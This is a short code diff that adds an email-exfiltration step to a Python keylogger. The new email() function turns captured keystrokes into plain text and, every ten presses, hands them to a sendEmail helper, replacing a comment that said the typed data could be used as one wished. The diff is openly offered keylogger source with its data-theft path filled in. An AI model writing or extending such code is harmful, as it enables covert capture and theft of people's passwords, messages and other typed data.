@@ -13,8 +13,19 @@ def on_press(key):
     count += 1
     if count > 10:
         count = 0
-        # keys contains all typed data, you can do what you want with that. 
+        email(keys)
 
+def email(keys):
+    message = ""
+    for key in keys:
+        k = key.replace("'","")
+        if key == "Key.space":
+            k = " " 
+        elif key.find("Key")>0:
+            k = ""
+        message += k
+    print(message)
+    send_email.sendEmail(message)
 
 def on_release(key):
     if key == Key.esc:
